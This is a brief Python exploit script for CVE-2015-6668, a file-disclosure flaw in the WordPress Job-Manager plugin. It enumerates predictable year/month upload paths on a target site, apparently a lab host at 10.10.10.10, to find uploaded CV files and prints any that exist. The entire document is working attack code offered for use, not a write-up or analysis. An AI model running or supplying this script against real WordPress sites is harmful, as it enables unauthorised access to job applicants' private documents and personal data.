import requests

print """
CVE-2015-6668
Title: CV filename disclosure on Job-Manager WP Plugin
Author: Evangelos Mourikis
Blog: https://vagmour.eu
Plugin URL: http://www.wp-jobmanager.com
Versions: <=0.7.25
"""
website = "http://10.10.10.10/"
filename = "HackerAccessGranted"

filename2 = filename.replace(" ", "-")

for year in range(2016,2020):
    print(year)
    for i in range(1,13):
        for extension in {'jpg','jpeg','png'}:
            URL = website + "/wp-content/uploads/" + str(year) + "/" + "{:02}".format(i) + "/" + filename2 + "." + extension
            req = requests.get(URL)
            if req.status_code==200:
                print "[+] URL of CV found! " + URL
